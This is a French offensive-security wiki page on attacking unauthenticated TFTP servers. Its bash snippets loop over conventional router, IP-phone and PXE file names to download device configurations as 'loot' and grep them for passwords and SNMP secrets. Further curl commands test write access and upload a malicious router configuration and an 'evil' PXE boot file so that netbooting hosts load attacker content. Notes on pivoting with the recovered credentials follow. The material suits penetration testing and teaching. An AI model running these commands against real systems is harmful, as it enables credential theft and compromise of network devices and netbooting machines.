---
title: "Lecture et écriture de fichiers : lire des fichiers sensibles et écrire sur TFTP"
order: 1
description: "TFTP n'a aucune authentification, de sorte que n'importe quel client lit les fichiers que le serveur expose et, là où les écritures sont activées, téléverse des fichiers. Comme TFTP sert des artefacts d'équipement et de démarrage, les lectures récupèrent des configurations de routeurs et de téléphones (avec identifiants), des firmwares et des fichiers PXE, et les écritures permettent à un attaquant de remplacer une configuration ou un fichier de démarrage qu'un équipement chargera, l'influençant ou le compromettant."
keywords:
  - tftp read
  - tftp write
  - config
  - pxe
  - firmware
---

# Lecture et écriture de fichiers

Les deux opérations de TFTP, lecture et écriture, sont toutes deux non authentifiées, de sorte que l'attaque consiste simplement à connaître (ou deviner) les noms de fichiers et à savoir si les écritures sont autorisées. La valeur vient de ce que TFTP sert : configurations d'équipements réseau, fichiers de provisionnement de téléphones, images de firmware et artefacts de démarrage PXE. Lire ces éléments récupère identifiants et configuration ; écrire, lorsque c'est activé, permet à un attaquant de remplacer un fichier qu'un équipement chargera, transformant le serveur TFTP en canal pour influencer ou compromettre l'équipement consommateur.

## Lire des artefacts connus

```bash
# device configs and provisioning files have conventional names; request them
for f in running-config startup-config router.cfg \
         SEPDEFAULT.cnf SIP<mac>.cnf XMLDefault.cnf.xml \
         pxelinux.cfg/default; do
  curl -s tftp://<target>/$f -o "loot_$(echo $f|tr / _)" && echo "got $f"; done
grep -riE 'password|secret|snmp|enable' loot_* 2>/dev/null
```

## Écrire pour influencer un consommateur

```bash
# if writes are allowed, replace a config/boot file the device will load
echo 'test' | curl -s -T - tftp://<target>/writetest && echo "writable"
curl -s -T malicious-running-config tftp://<target>/running-config   # e.g. push a config
# PXE: write/replace a boot config so a netbooting host loads attacker content
curl -s -T evil-default tftp://<target>/pxelinux.cfg/default
```

## Notes d'exploitation

- Il n'y a pas de listage, le succès dépend donc des noms de fichiers ; utilisez les noms conventionnels de la classe d'équipement (`running-config`/`startup-config` Cisco, `SEP<mac>.cnf` pour les téléphones Cisco, `pxelinux.cfg/default` PXE) et `tftp-enum` pour les plus courants.
- Lisez les configurations à la recherche d'identifiants intégrés (mots de passe enable/SNMP/VTY, secrets de provisionnement) qui permettent de rebondir vers l'équipement et au-delà.
- Un serveur TFTP accessible en écriture et consommé par un équipement est un canal de compromission : remplacer une configuration ou un fichier de démarrage influence ce que l'équipement exécute ; l'écriture PXE est une voie vers l'exécution de code sur les hôtes démarrant par le réseau.
- TFTP est en UDP et sans connexion ; un pare-feu peut l'autoriser là où les services TCP sont bloqués, et l'absence d'authentification signifie que l'accessibilité constitue tout le contrôle d'accès.

## Références

- [RFC 1350 (lecture/écriture TFTP)](https://datatracker.ietf.org/doc/html/rfc1350)
- [HackTricks : TFTP](https://book.hacktricks.xyz/network-services-pentesting/69-udp-tftp)
